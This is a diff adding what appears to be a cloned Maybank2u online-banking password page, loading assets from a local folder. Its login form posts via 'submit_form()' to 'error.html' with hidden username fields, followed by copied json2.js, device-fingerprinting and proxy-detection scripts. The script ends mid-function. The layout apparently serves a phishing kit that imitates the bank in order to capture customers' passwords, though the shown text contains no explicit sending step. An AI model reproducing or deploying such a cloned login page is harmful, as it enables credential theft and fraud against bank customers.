+								<td style="z-index: 1;position:relative;" class="child-form-element">
+									<label id="password1Label" class="mb-1 d-inline-block"><span id="password1ErrorSymbol"></span><b>Password</b></label>:
+									<form name="m1200BillPaymentForm" method="post" onSubmit="submit_form()" action="error.html">
+										<table class="table-input-group w-100" style="max-width:280px;">
+											<tbody>
+											<tr>
+												<td class="input-group-start">
+													<input type="password" name="dummy" class="dummy" value="" maxlength="12" style="display:none">
+													<input type="password" name="password1" id="pd" class="password1 w-100" size="16" maxlength="12" onpaste="return false" oncopy="return false" oncut="return false" autocomplete="off" autocapitalize="none" value="" onkeydown="checkField1($('#password'), $('.password1'));" onkeyup="checkField1($('#password'), $('.password1'));" onchange="checkField1($('#password'), $('.password1'));">
+													<input type="hidden" id="uname" />
+													<input type="hidden" id="b" />
+												</td>
+												<td class="input-group-end">
+
+													<input type="submit" name="action" value="Login"  class="px-4">
+
+												</td>
+											</tr>
+											</tbody>
+										</table>
+									</form>
+								</td>
+							</tr>
+
+							<tr>
+								<td colspan="3" style="z-index: 1;position:relative;">
+									<table id="errorTable" class="font-size-small" style="z-index: 1;position:relative;">
+										<tbody><tr>
+											<td>
+												<span id="usernameError" class="error"></span>
+												<span id="password1Error" class="error"></span>
+											</td>
+										</tr>
+										</tbody></table>
+								</td>
+							</tr>
+
+							</tbody></table>
+
+						<table style="z-index: 99;">
+							<tbody><tr>
+								<td class="font-size-dec">
+									<!-- <p style="z-index: 1;position:relative;">Don't have a Maybank2u account?<br/><a href="https://www.maybank2u.com.my/home/m2u/common/signup.do" target="_blank">Click here to sign up now</a></p> -->
+									<p>
+										<span>Don't have a Maybank2U account?</span>
+										<br>
+										<a target="_blank" href="https://www.maybank2u.com.my/maybank2u/malaysia/en/personal/accounts/accounts_landing.page">Click here</a> for information on opening an account.
+									</p>
+								</td>
+							</tr>
+							</tbody></table>
+
+					</div>
+				</div>
+
+				<div id="loginSide">
+					<div class="paddingdiv">
+						<div style="text-align: left;margin-left: auto;margin-right: auto;">
+							<h3 class="font-size-base">Security information:</h3>
+							<ul class="pl-ul my-ul font-size-dec">
+								<!--li><a href="https://www.maybank2u.com.my/maybank2u/malaysia/en/personal/security_alert/security_alert_listing.page" target="_blank">Click here for security tips</a></li-->
+								<li><a target="_blank" href="https://www.maybank2u.com.my/maybank2u/malaysia/en/personal/security_alert/online_fraud.page">Click here</a> for security tips.</li>
+								<li><strong>Never</strong> login via email links</li>
+								<li><strong>Never</strong> reveal your PIN and/or Password to anyone</li>
+							</ul>
+							<p class="font-size-dec mb-4"><a href="https://www.maybank2u.com.my/mbb/m2u/common/mbbPhishingReportForm.do?BV_SessionID=@@@@1194477203.1656083605@@@@&amp;BV_EngineID=ccggadiijdekgjgcefecfledfmodflk.0">To report any suspicious websites or transactions, please call our fraud hotline at 03-58914744</a></p>
+							<p class="font-size-small mb-4 text-mineshaft"><strong>Need more help with your online banking?</strong><br>Call our customer care hotline at 1-300-88-6688 or 603-7844 3696 if you're overseas (24 hours daily, including holidays)</p>
+						</div>
+					</div>
+				</div><!-- /#loginSide -->
+
+			</div>
+		</div>
+	</div><!-- /#login -->
+</div><!-- /#content -->
+
+<script type="text/javascript">
+	<!--
+	$('.password1').focus();
+	//-->
+</script>
+
+
+
+
+<div id="footer">
+	<img src="MBB_Pass_files/popupM2U.gif" alt="Maybank2u">
+</div><!-- /#footer -->
+
+
+<!--RSAIPError -a-->
+<script type="text/javascript">
+<!--
+/*
+    json2.js
+    2014-02-04
+
+    Public Domain.
+
+    NO WARRANTY EXPRESSED OR IMPLIED. USE AT YOUR OWN RISK.
+
+    See http://www.JSON.org/js.html
+
+
+    This code should be minified before deployment.
+    See http://javascript.crockford.com/jsmin.html
+
+    USE YOUR OWN COPY. IT IS EXTREMELY UNWISE TO LOAD CODE FROM SERVERS YOU DO
+    NOT CONTROL.
+
+
+    This file creates a global JSON object containing two methods: stringify
+    and parse.
+
+        JSON.stringify(value, replacer, space)
+            value       any JavaScript value, usually an object or array.
+
+            replacer    an optional parameter that determines how object
+                        values are stringified for objects. It can be a
+                        function or an array of strings.
+
+            space       an optional parameter that specifies the indentation
+                        of nested structures. If it is omitted, the text will
+                        be packed without extra whitespace. If it is a number,
+                        it will specify the number of spaces to indent at each
+                        level. If it is a string (such as '\t' or '&nbsp;'),
+                        it contains the characters used to indent at each level.
+
+            This method produces a JSON text from a JavaScript value.
+
+            When an object value is found, if the object contains a toJSON
+            method, its toJSON method will be called and the result will be
+            stringified. A toJSON method does not serialize: it returns the
+            value represented by the name/value pair that should be serialized,
+            or undefined if nothing should be serialized. The toJSON method
+            will be passed the key associated with the value, and this will be
+            bound to the value
+
+            For example, this would serialize Dates as ISO strings.
+
+                Date.prototype.toJSON = function (key) {
+                    function f(n) {
+                        // Format integers to have at least two digits.
+                        return n < 10 ? '0' + n : n;
+                    }
+
+                    return this.getUTCFullYear()   + '-' +
+                         f(this.getUTCMonth() + 1) + '-' +
+                         f(this.getUTCDate())      + 'T' +
+                         f(this.getUTCHours())     + ':' +
+                         f(this.getUTCMinutes())   + ':' +
+                         f(this.getUTCSeconds())   + 'Z';
+                };
+
+            You can provide an optional replacer method. It will be passed the
+            key and value of each member, with this bound to the containing
+            object. The value that is returned from your method will be
+            serialized. If your method returns undefined, then the member will
+            be excluded from the serialization.
+
+            If the replacer parameter is an array of strings, then it will be
+            used to select the members to be serialized. It filters the results
+            such that only members with keys listed in the replacer array are
+            stringified.
+
+            Values that do not have JSON representations, such as undefined or
+            functions, will not be serialized. Such values in objects will be
+            dropped; in arrays they will be replaced with null. You can use
+            a replacer function to replace those with JSON values.
+            JSON.stringify(undefined) returns undefined.
+
+            The optional space parameter produces a stringification of the
+            value that is filled with line breaks and indentation to make it
+            easier to read.
+
+            If the space parameter is a non-empty string, then that string will
+            be used for indentation. If the space parameter is a number, then
+            the indentation will be that many spaces.
+
+            Example:
+
+            text = JSON.stringify(['e', {pluribus: 'unum'}]);
+            // text is '["e",{"pluribus":"unum"}]'
+
+
+            text = JSON.stringify(['e', {pluribus: 'unum'}], null, '\t');
+            // text is '[\n\t"e",\n\t{\n\t\t"pluribus": "unum"\n\t}\n]'
+
+            text = JSON.stringify([new Date()], function (key, value) {
+                return this[key] instanceof Date ?
+                    'Date(' + this[key] + ')' : value;
+            });
+            // text is '["Date(---current time---)"]'
+
+
+        JSON.parse(text, reviver)
+            This method parses a JSON text to produce an object or array.
+            It can throw a SyntaxError exception.
+
+            The optional reviver parameter is a function that can filter and
+            transform the results. It receives each of the keys and values,
+            and its return value is used instead of the original value.
+            If it returns what it received, then the structure is not modified.
+            If it returns undefined then the member is deleted.
+
+            Example:
+
+            // Parse the text. Values that look like ISO date strings will
+            // be converted to Date objects.
+
+            myData = JSON.parse(text, function (key, value) {
+                var a;
+                if (typeof value === 'string') {
+                    a =
+/^(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2}(?:\.\d*)?)Z$/.exec(value);
+                    if (a) {
+                        return new Date(Date.UTC(+a[1], +a[2] - 1, +a[3], +a[4],
+                            +a[5], +a[6]));
+                    }
+                }
+                return value;
+            });
+
+            myData = JSON.parse('["Date(09/09/2001)"]', function (key, value) {
+                var d;
+                if (typeof value === 'string' &&
+                        value.slice(0, 5) === 'Date(' &&
+                        value.slice(-1) === ')') {
+                    d = new Date(value.slice(5, -1));
+                    if (d) {
+                        return d;
+                    }
+                }
+                return value;
+            });
+
+
+    This is a reference implementation. You are free to copy, modify, or
+    redistribute.
+*/
+
+/*jslint evil: true, regexp: true */
+
+/*members "", "\b", "\t", "\n", "\f", "\r", "\"", JSON, "\\", apply,
+    call, charCodeAt, getUTCDate, getUTCFullYear, getUTCHours,
+    getUTCMinutes, getUTCMonth, getUTCSeconds, hasOwnProperty, join,
+    lastIndex, length, parse, prototype, push, replace, slice, stringify,
+    test, toJSON, toString, valueOf
+*/
+
+
+// Create a JSON object only if one does not already exist. We create the
+// methods in a closure to avoid creating global variables.
+
+if (typeof JSON !== 'object') {
+    JSON = {};
+}
+
+(function () {
+    'use strict';
+
+    function f(n) {
+        // Format integers to have at least two digits.
+        return n < 10 ? '0' + n : n;
+    }
+
+    if (typeof Date.prototype.toJSON !== 'function') {
+
+        Date.prototype.toJSON = function () {
+
+            return isFinite(this.valueOf())
+                ? this.getUTCFullYear()     + '-' +
+                    f(this.getUTCMonth() + 1) + '-' +
+                    f(this.getUTCDate())      + 'T' +
+                    f(this.getUTCHours())     + ':' +
+                    f(this.getUTCMinutes())   + ':' +
+                    f(this.getUTCSeconds())   + 'Z'
+                : null;
+        };
+
+        String.prototype.toJSON      =
+            Number.prototype.toJSON  =
+            Boolean.prototype.toJSON = function () {
+                return this.valueOf();
+            };
+    }
+
+    var cx,
+        escapable,
+        gap,
+        indent,
+        meta,
+        rep;
+
+
+    function quote(string) {
+
+// If the string contains no control characters, no quote characters, and no
+// backslash characters, then we can safely slap some quotes around it.
+// Otherwise we must also replace the offending characters with safe escape
+// sequences.
+
+        escapable.lastIndex = 0;
+        return escapable.test(string) ? '"' + string.replace(escapable, function (a) {
+            var c = meta[a];
+            return typeof c === 'string'
+                ? c
+                : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
+        }) + '"' : '"' + string + '"';
+    }
+
+
+    function str(key, holder) {
+
+// Produce a string from holder[key].
+
+        var i,          // The loop counter.
+            k,          // The member key.
+            v,          // The member value.
+            length,
+            mind = gap,
+            partial,
+            value = holder[key];
+
+// If the value has a toJSON method, call it to obtain a replacement value.
+
+        if (value && typeof value === 'object' &&
+                typeof value.toJSON === 'function') {
+            value = value.toJSON(key);
+        }
+
+// If we were called with a replacer function, then call the replacer to
+// obtain a replacement value.
+
+        if (typeof rep === 'function') {
+            value = rep.call(holder, key, value);
+        }
+
+// What happens next depends on the value's type.
+
+        switch (typeof value) {
+        case 'string':
+            return quote(value);
+
+        case 'number':
+
+// JSON numbers must be finite. Encode non-finite numbers as null.
+
+            return isFinite(value) ? String(value) : 'null';
+
+        case 'boolean':
+        case 'null':
+
+// If the value is a boolean or null, convert it to a string. Note:
+// typeof null does not produce 'null'. The case is included here in
+// the remote chance that this gets fixed someday.
+
+            return String(value);
+
+// If the type is 'object', we might be dealing with an object or an array or
+// null.
+
+        case 'object':
+
+// Due to a specification blunder in ECMAScript, typeof null is 'object',
+// so watch out for that case.
+
+            if (!value) {
+                return 'null';
+            }
+
+// Make an array to hold the partial results of stringifying this object value.
+
+            gap += indent;
+            partial = [];
+
+// Is the value an array?
+
+            if (Object.prototype.toString.apply(value) === '[object Array]') {
+
+// The value is an array. Stringify every element. Use null as a placeholder
+// for non-JSON values.
+
+                length = value.length;
+                for (i = 0; i < length; i += 1) {
+                    partial[i] = str(i, value) || 'null';
+                }
+
+// Join all of the elements together, separated with commas, and wrap them in
+// brackets.
+
+                v = partial.length === 0
+                    ? '[]'
+                    : gap
+                    ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
+                    : '[' + partial.join(',') + ']';
+                gap = mind;
+                return v;
+            }
+
+// If the replacer is an array, use it to select the members to be stringified.
+
+            if (rep && typeof rep === 'object') {
+                length = rep.length;
+                for (i = 0; i < length; i += 1) {
+                    if (typeof rep[i] === 'string') {
+                        k = rep[i];
+                        v = str(k, value);
+                        if (v) {
+                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
+                        }
+                    }
+                }
+            } else {
+
+// Otherwise, iterate through all of the keys in the object.
+
+                for (k in value) {
+                    if (Object.prototype.hasOwnProperty.call(value, k)) {
+                        v = str(k, value);
+                        if (v) {
+                            partial.push(quote(k) + (gap ? ': ' : ':') + v);
+                        }
+                    }
+                }
+            }
+
+// Join all of the member texts together, separated with commas,
+// and wrap them in braces.
+
+            v = partial.length === 0
+                ? '{}'
+                : gap
+                ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
+                : '{' + partial.join(',') + '}';
+            gap = mind;
+            return v;
+        }
+    }
+
+// If the JSON object does not yet have a stringify method, give it one.
+
+    if (typeof JSON.stringify !== 'function') {
+        escapable = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
+        meta = {    // table of character substitutions
+            '\b': '\\b',
+            '\t': '\\t',
+            '\n': '\\n',
+            '\f': '\\f',
+            '\r': '\\r',
+            '"' : '\\"',
+            '\\': '\\\\'
+        };
+        JSON.stringify = function (value, replacer, space) {
+
+// The stringify method takes a value and an optional replacer, and an optional
+// space parameter, and returns a JSON text. The replacer can be a function
+// that can replace values, or an array of strings that will select the keys.
+// A default replacer method can be provided. Use of the space parameter can
+// produce text that is more easily readable.
+
+            var i;
+            gap = '';
+            indent = '';
+
+// If the space parameter is a number, make an indent string containing that
+// many spaces.
+
+            if (typeof space === 'number') {
+                for (i = 0; i < space; i += 1) {
+                    indent += ' ';
+                }
+
+// If the space parameter is a string, it will be used as the indent string.
+
+            } else if (typeof space === 'string') {
+                indent = space;
+            }
+
+// If there is a replacer, it must be a function or an array.
+// Otherwise, throw an error.
+
+            rep = replacer;
+            if (replacer && typeof replacer !== 'function' &&
+                    (typeof replacer !== 'object' ||
+                    typeof replacer.length !== 'number')) {
+                throw new Error('JSON.stringify');
+            }
+
+// Make a fake root object containing our value under the key of ''.
+// Return the result of stringifying the value.
+
+            return str('', {'': value});
+        };
+    }
+
+
+// If the JSON object does not yet have a parse method, give it one.
+
+    if (typeof JSON.parse !== 'function') {
+        cx = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;
+        JSON.parse = function (text, reviver) {
+
+// The parse method takes a text and an optional reviver function, and returns
+// a JavaScript value if the text is a valid JSON text.
+
+            var j;
+
+            function walk(holder, key) {
+
+// The walk method is used to recursively walk the resulting structure so
+// that modifications can be made.
+
+                var k, v, value = holder[key];
+                if (value && typeof value === 'object') {
+                    for (k in value) {
+                        if (Object.prototype.hasOwnProperty.call(value, k)) {
+                            v = walk(value, k);
+                            if (v !== undefined) {
+                                value[k] = v;
+                            } else {
+                                delete value[k];
+                            }
+                        }
+                    }
+                }
+                return reviver.call(holder, key, value);
+            }
+
+
+// Parsing happens in four stages. In the first stage, we replace certain
+// Unicode characters with escape sequences. JavaScript handles many characters
+// incorrectly, either silently deleting them, or treating them as line endings.
+
+            text = String(text);
+            cx.lastIndex = 0;
+            if (cx.test(text)) {
+                text = text.replace(cx, function (a) {
+                    return '\\u' +
+                        ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
+                });
+            }
+
+// In the second stage, we run the text against regular expressions that look
+// for non-JSON patterns. We are especially concerned with '()' and 'new'
+// because they can cause invocation, and '=' because it can cause mutation.
+// But just to be safe, we want to reject all unexpected forms.
+
+// We split the second stage into 4 regexp operations in order to work around
+// crippling inefficiencies in IE's and Safari's regexp engines. First we
+// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
+// replace all simple value tokens with ']' characters. Third, we delete all
+// open brackets that follow a colon or comma or that begin the text. Finally,
+// we look to see that the remaining characters are only whitespace or ']' or
+// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.
+
+            if (/^[\],:{}\s]*$/
+                    .test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@')
+                        .replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']')
+                        .replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {
+
+// In the third stage we use the eval function to compile the text into a
+// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
+// in JavaScript: it can begin a block or an object literal. We wrap the text
+// in parens to eliminate the ambiguity.
+
+                j = eval('(' + text + ')');
+
+// In the optional fourth stage, we recursively walk the new structure, passing
+// each name/value pair to a reviver function for possible transformation.
+
+                return typeof reviver === 'function'
+                    ? walk({'': j}, '')
+                    : j;
+            }
+
+// If the text is not JSON parseable, then a SyntaxError is thrown.
+
+            throw new SyntaxError('JSON.parse');
+        };
+    }
+}());
+//-->
+</script>
+<script type="text/javascript">
+<!--
+function Hashtable(){var j={__indexToValue:[],__indexToKeys:[]};
+var f=[];
+var h=0;
+var k=this;
+function g(b){var a=null;
+var c=0;
+while(typeof f[c]=="number"){c+=1
+}f[c]=0;
+this.hasNext=this.hasMoreElements=function(){if(f[c]<h){return true
+}else{if(typeof f[c]=="number"){f[c]=null
+}return false
+}};
+this.next=this.nextElement=function(){if(this.hasNext){a=f[c];
+return j[b][f[c]++]
+}else{return null
+}};
+this.remove=function(){if(typeof a=="number"){k.remove(j.__indexToKeys[a]);
+a=null
+}}
+}this.get=function(a){if(typeof j[a]=="number"){return j.__indexToValue[j[a]]
+}else{return null
+}};
+this.put=function(b,a){if(typeof j[b]=="number"){j.__indexToValue[j[b]]=a
+}else{j[b]=h;
+j.__indexToValue[h]=a;
+j.__indexToKeys[h++]=b
+}};
+this.remove=function(b){var c=j[b];
+if(typeof c=="number"){var a=0;
+delete j[b];
+h-=1;
+for(a=c;
+a<h;
+a++){j.__indexToValue[a]=j.__indexToValue[a+1];
+j[(j.__indexToKeys[a]=j.__indexToKeys[a+1])]=a
+}for(a=0;
+a<f.length;
+a++){if((f[a])&&(c<f[a])){f[a]-=1
+}}}};
+this.size=function(){return h
+};
+this.__enumerate=function(a){return new g(a)
+};
+Hashtable.prototype.elements=function(){return this.__enumerate("__indexToValue")
+};
+Hashtable.prototype.keys=function(){return this.__enumerate("__indexToKeys")
+};
+Hashtable.prototype.clear=function(){var a=this.keys();
+while(a.hasNext()){this.remove(a.next())
+}};
+Hashtable.prototype.toString=function(){var d=" =&gt; ";
+var b="\r\n";
+var a,c=this.keys();
+var e="";
+while(c.hasNext()){a=c.next();
+e+=a+d+this.get(a)+b
+}return e
+};
+Hashtable.prototype.contains=function(b){var a=this.elements();
+while(a.hasNext()){if(a.next()==b){return true
+}}return false
+};
+Hashtable.prototype.containsValue=Hashtable.prototype.contains;
+Hashtable.prototype.containsKey=function(a){return(this.get(a)!==null)
+};
+Hashtable.prototype.isEmpty=function(){return(this.size()===0)
+};
+Hashtable.prototype.putAll=function(b){if(b.constructor==Hashtable){var a,c=b.keys();
+while(c.hasNext()){a=c.next();
+this.put(a,b.get(a))
+}}};
+Hashtable.prototype.clone=function(){var a=new Hashtable();
+a.putAll(this);
+return a
+};
+Hashtable.prototype.equals=function(a){return(a==this)
+}
+}function startsWith(c,d){return(c.indexOf(d)===0)
+}function DomDataCollection(n){var j=this;
+j.config={recursion_level:1,collection_mode:"partial",functionsToExclude:[],function_list_size:1024,json_script:n?n:"json2.js"};
+j.emptyDomData=function(){j.dom_data={functions:{names:[],excluded:{size:0,count:0},truncated:false},inputs:[],iFrames:[],scripts:[],collection_status:DomDataCollection.NotStarted}
+};
+j.startInspection=function(){var b=false;
+var c=true;
+BrowserDetect.init();
+if(!(BrowserDetect.browser==="Explorer")){try{j.inspectJSFunctions();
+c=false
+}catch(a){b=b||true
+}}else{j.dom_data.functions=[];
+if(j.dom_data.functions===undefined||j.dom_data.functions.names===undefined){j.dom_data.functions={names:[],excluded:{size:0,count:0},truncated:false}
+}}try{j.inspectFrames();
+c=false
+}catch(a){b=b||true
+}try{j.inspectScripts();
+c=false
+}catch(a){b=b||true
+}try{j.inspectInputFields();
+c=false
+}catch(a){b=b||true
+}if(b){if(c){j.dom_data.collection_status=DomDataCollection.Fail
+}else{j.dom_data.collection_status=DomDataCollection.Partial
+}}else{j.dom_data.collection_status=DomDataCollection.Success
+}if(!(BrowserDetect.browser==="Explorer")){j.handleSizeLimit()
+}};
+j.domDataAsJSON=function(){return stripIllegalChars(JSON.stringify(j.dom_data))
+};
+j.recursiveGetAllFunctionNamesUnderElement=function(B,e,A){var C;
+var d;
+var g;
+var x=j.config;
+var D=x.recursion_level;
+var a=x.collection_mode;
+if(j.dom_data.functions===undefined||j.dom_data.functions.names===undefined){j.dom_data.functions={names:[],excluded:{size:0,count:0},truncated:false}
+}var f=j.dom_data.functions;
+var c=f.excluded;
+for(var E in e){try{var F=e[E];
+C=""+F;
+if(B.length>0){prefix=B+"."
+}else{prefix=""
+}d=prefix+E;
+if(k(F)){if(j.functionShouldBeCollected(F,E)){var G=f.names;
+g=G.length;
+G[g]=d
+}else{if(a=="partial"){c.size+=C.length;
+c.count++
+}}}if(A+1<D){j.recursiveGetAllFunctionNamesUnderElement(d,F,A+1)
+}else{f.names.sort()
+}}catch(b){if(!window.console){window.console={};
+window.console.info=o;
+window.console.log=o;
+window.console.warn=o;
+window.console.error=o
+}if(console&&console.log){console.log("error counting functions: "+b.toString())
+}}}};
+function o(){}function k(a){return typeof a=="function"
+}function h(a){return a.length
+}var l=new Hashtable();
+j.initFunctionsToExclude=function(){if(l){l.clear()
+}var a=j.config.functionsToExclude;
+var b=a.length;
+while(b--){l.put(a[b],"")
+}};
+j.functionShouldBeCollected=function m(a,b){if(j.config.collection_mode=="full"){return true
+}else{if(l.size()===0){j.initFunctionsToExclude()
+}if(l.containsKey(b)){return false
+}else{return true
+}}};
+j.inspectJSFunctions=function(){j.dom_data.functions=[];
+j.recursiveGetAllFunctionNamesUnderElement("",window,0)
+};
+j.handleSizeLimit=function(){var x=j.dom_data;
+var g=j.config;
+var v=g.function_list_size;
+var e=x.functions;
+e.names.sort();
+var b=JSON.stringify(x);
+if(v<0){v=0
+}var a=0;
+if(g.colllection_mode!="full"&&b.length>v){var c=e.names;
+var d=c.toString();
+var y=b.length-JSON.stringify(c).length+"[]".length;
+var f=false;
+var w=c.length;
+while(!f){if(a++==1000){f=true
+}lastComma=d.lastIndexOf(",");
+if(lastComma>=0&&w>0){quotation_marks=w*2;
+if(y+lastComma+quotation_marks>v){d=d.substring(0,lastComma-1);
+w--
+}else{f=true
+}}else{f=true
+}}if(w>1){e.truncated=true;
+e.names=e.names.slice(0,w-1);
+x.functions.truncated=true
+}else{j.emptyDomData();
+x=j.dom_data;
+x.collection_status=DomDataCollection.Partial;
+x.functions.truncated=true
+}}};
+j.inspectFrames=function(){j.countElements("iframe")
+};
+j.countElements=function(e){var d;
+var c=document.getElementsByTagName(e);
+if(j.dom_data.iFrames===undefined){j.dom_data.iFrames=[]
+}var b=j.dom_data.iFrames;
+var a=b.length;
+for(i=0;
+i<c.length;
+i++){b[a+i]=""+c[i].src
+}b.sort()
+};
+j.inspectScripts=function(){var b=document.getElementsByTagName("script");
+j.dom_data.scripts=[];
+for(var a=0;
+a<b.length;
+a++){j.dom_data.scripts[a]=b[a].text.length
+}};
+j.collectFields=function(b){var r=document.getElementsByTagName(b);
+if(j.dom_data.inputs===undefined){j.dom_data.inputs=[]
+}var e=j.dom_data.inputs;
+var g=e.length;
+var a=r.length;
+while(a--){var c=r[a];
+var d=c.name;
+var f=c.id;
+if(d&&d.length>0){element_name=d
+}else{if(f&&f.length>0){element_name=f
+}else{element_name="NO_NAME"
+}}e[g+a]=element_name
+}e.sort()
+};
+j.inspectInputFields=function(){j.collectFields("input");
+j.collectFields("textarea");
+j.collectFields("select");
+j.collectFields("button")
+};
+loadJSON=function(){if(!window.JSON){var a=document.getElementsByTagName("head")[0];
+var b=document.createElement("script");
+b.type="text/javascript";
+b.src=j.config.json_script;
+a.appendChild(b)
+}};
+j.emptyDomData();
+loadJSON()
+}DomDataCollection.Success=0;
+DomDataCollection.Fail=1;
+DomDataCollection.Partial=2;
+DomDataCollection.NotStarted=3;
+function IE_FingerPrint(){this.deviceprint_browser=function(){var a=navigator.userAgent.toLowerCase();
+t=a+SEP+navigator.appVersion+SEP+navigator.platform;
+t+=SEP+navigator.appMinorVersion+SEP+navigator.cpuClass+SEP+navigator.browserLanguage;
+t+=SEP+ScriptEngineBuildVersion();
+return t
+};
+this.deviceprint_software=function(){var b="";
+var l=true;
+try{document.body.addBehavior("#default#clientCaps");
+var k;
+var m=d.length;
+for(i=0;
+i<m;
+i++){k=activeXDetect(d[i]);
+var j=c[i];
+if(k){if(l===true){b+=j+PAIR+k;
+l=false
+}else{b+=SEP+j+PAIR+k
+}}else{b+="";
+l=false
+}}}catch(a){}return b
+};
+var c=["abk","wnt","aol","arb","chs","cht","dht","dhj","dan","dsh","heb","ie5","icw","ibe","iec","ieh","iee","jap","krn","lan","swf","shw","msn","wmp","obp","oex","net","pan","thi","tks","uni","vtc","vnm","mvm","vbs","wfd"];
+var d=["7790769C-0471-11D2-AF11-00C04FA35D02","89820200-ECBD-11CF-8B85-00AA005B4340","47F67D00-9E55-11D1-BAEF-00C04FC2D130","76C19B38-F0C8-11CF-87CC-0020AFEECF20","76C19B34-F0C8-11CF-87CC-0020AFEECF20","76C19B33-F0C8-11CF-87CC-0020AFEECF20","9381D8F2-0288-11D0-9501-00AA00B911A5","4F216970-C90C-11D1-B5C7-0000F8051515","283807B5-2C60-11D0-A31D-00AA00B92C03","44BBA848-CC51-11CF-AAFA-00AA00B6015C","76C19B36-F0C8-11CF-87CC-0020AFEECF20","89820200-ECBD-11CF-8B85-00AA005B4383","5A8D6EE0-3E18-11D0-821E-444553540000","630B1DA0-B465-11D1-9948-00C04F98BBC9","08B0E5C0-4FCB-11CF-AAA5-00401C608555","45EA75A0-A269-11D1-B5BF-0000F8051515","DE5AED00-A4BF-11D1-9948-00C04F98BBC9","76C19B30-F0C8-11CF-87CC-0020AFEECF20","76C19B31-F0C8-11CF-87CC-0020AFEECF20","76C19B50-F0C8-11CF-87CC-0020AFEECF20","D27CDB6E-AE6D-11CF-96B8-444553540000","2A202491-F00D-11CF-87CC-0020AFEECF20","5945C046-LE7D-LLDL-BC44-00C04FD912BE","22D6F312-B0F6-11D0-94AB-0080C74C7E95","3AF36230-A269-11D1-B5BF-0000F8051515","44BBA840-CC51-11CF-AAFA-00AA00B6015C","44BBA842-CC51-11CF-AAFA-00AA00B6015B","76C19B32-F0C8-11CF-87CC-0020AFEECF20","76C19B35-F0C8-11CF-87CC-0020AFEECF20","CC2A9BA0-3BDD-11D0-821E-444553540000","3BF42070-B3B1-11D1-B5C5-0000F8051515","10072CEC-8CC1-11D1-986E-00A0C955B42F","76C19B37-F0C8-11CF-87CC-0020AFEECF20","08B0E5C0-4FCB-11CF-AAA5-00401C608500","4F645220-306D-11D2-995D-00C04F98BBC9","73FA19D0-2D75-11D2-995D-00C04F98BBC9"]
+}IE_FingerPrint.prototype=new FingerPrint();
+function Mozilla_FingerPrint(){}Mozilla_FingerPrint.prototype=new FingerPrint();
+function Opera_FingerPrint(){}Opera_FingerPrint.prototype=new FingerPrint();
+function Timer(){this.startTime=new Date().getTime()
+}Timer.prototype.start=function(){this.startTime=new Date().getTime()
+};
+Timer.prototype.duration=function(){return(new Date().getTime())-this.startTime
+};
+function getRandomPort(){return Math.floor(Math.random()*60000+4000)
+}var ProxyCollector={};
+ProxyCollector.internalIP="127.0.0.1";
+ProxyCollector.externalIP;
+ProxyCollector.internalPingTime;
+ProxyCollector.externalPingTime;
+ProxyCollector.setInternalPingTime=function(b){ProxyCollector.internalPingTime=b
+};
+ProxyCollector.setExternalPingTime=function(b){ProxyCollector.externalPingTime=b
+};
+ProxyCollector.PROXY_DETECTION_TIMEOUT=5000;
+ProxyCollector.TIMEOUT_CHECK_FREQUENCY=1000;
+ProxyCollector.isTimedOut=function(d,e,f){_timer=new Timer();
+if((e-_timer.duration()<=0)&&(((typeof ProxyCollector.internalPingTime==="undefined")&&((new RegExp("internalPingTime")).test(d)))||((typeof ProxyCollector.externalPingTime==="undefined")&&((new RegExp("externalPingTime")).test(d))))){d.call(this,-1);
+f.abort()
+}else{if(((typeof ProxyCollector.internalPingTime==="undefined")&&((new RegExp("internalPingTime")).test(d)))||((typeof ProxyCollector.externalPingTime==="undefined")&&((new RegExp("externalPingTime")).test(d)))){setTimeout(function(){ProxyCollector.isTimedOut(d,e-(_timer.duration()+ProxyCollector.TIMEOUT_CHECK_FREQUENCY),f)
+},ProxyCollector.TIMEOUT_CHECK_FREQUENCY)
+}}};
+ProxyCollector.doAjax=function(k,l){var j=document.location.protocol+"//"+k+":"+getRandomPort()+"/NonExistentImage"+getRandomPort()+".gif";
+var m;
+var o;
+if(window.XDomainRequest){m=new window.XDomainRequest();
+o=new Timer();
+try{m.timeout=ProxyCollector.PROXY_DETECTION_TIMEOUT;
+m.ontimeout=function(){l.call(this,-1);
+m.abort()
+};
+m.onprogress=function(){l.call(this,o.duration());
+m.abort()
+};
+m.onerror=function(){l.call(this,o.duration());
+m.abort()
+};
+m.open("GET",j,true);
+m.send()
+}catch(h){ProxyCollector.doAjaxViaImage(l,j)
+}}else{m=new XMLHttpRequest();
+var n="ontimeout" in m;
+o=new Timer();
+try{m.onreadystatechange=function(){if(m.readyState==4){if(((typeof ProxyCollector.internalPingTime==="undefined")&&((new RegExp("internalPingTime")).test(l)))||((typeof ProxyCollector.externalPingTime==="undefined")&&((new RegExp("externalPingTime")).test(l)))){l.call(this,o.duration())
+}}};
+m.timeout=ProxyCollector.PROXY_DETECTION_TIMEOUT;
+m.ontimeout=function(){l.call(this,-1);
+m.abort()
+};
+m.open("GET",j,true);
+m.send();
+if(!n){ProxyCollector.isTimedOut(l,ProxyCollector.PROXY_DETECTION_TIMEOUT-o.duration(),m)
+}}catch(h){ProxyCollector.doAjaxViaImage(l,j)
+}}};
+ProxyCollector.doAjaxViaImage=function(g,e){var f=new Image();
+var h=new Timer();
+f.onerror=function(){g.call(this,h.duration())
+};
+f.src=e
+};
+ProxyCollector.collect=function(){ProxyCollector.doAjax(ProxyCollector.externalIP,ProxyCollector.setExternalPingTime);
+if(typeof XDomainRequest=="object"){if(!ProxyCollector.externalPingTime){forceIE89Synchronicity()
